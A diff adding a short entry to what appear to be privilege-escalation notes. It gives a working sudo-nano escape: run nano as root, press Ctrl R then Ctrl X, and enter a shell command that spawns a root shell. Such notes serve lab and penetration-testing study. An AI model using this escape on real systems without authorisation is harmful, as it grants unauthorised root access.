@@ -102,3 +102,24 @@ sudo /usr/local/sbin/changename.sh
 
 ---
 
+/bin/nano /opt/priv
+
+```
+sudo -u root /bin/nano /opt/priv
+```
+
+Press Ctrl R
+
+Press Ctrl X 
+
+```
+reset; sh 1>&0 2>&0
+```
+In the command box
+
+Press Enter
+
+root
+
+---
+
